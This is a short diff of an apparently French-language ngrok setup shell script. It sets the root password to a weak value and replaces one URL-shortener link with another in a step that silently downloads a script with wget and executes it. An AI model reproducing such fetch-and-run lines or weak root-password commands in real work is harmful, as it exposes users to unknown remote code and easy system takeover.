@@ -1,8 +1,8 @@
 echo -e "$123\n$123\n" | sudo passwd
 rm -rf ngrok  ngrok.zip  ng.sh > /dev/null 2>&1
-wget -O ng.sh https://bit.ly/3KKfa8J > /dev/null 2>&1
-chmod +x ng.sh
-./ng.sh
+wget -O NG.sh shorturl.at/absy2 > /dev/null 2>&1
+chmod +x NG.sh
+./NG.sh
 clear
 echo "======================="
 echo Choisi ta region
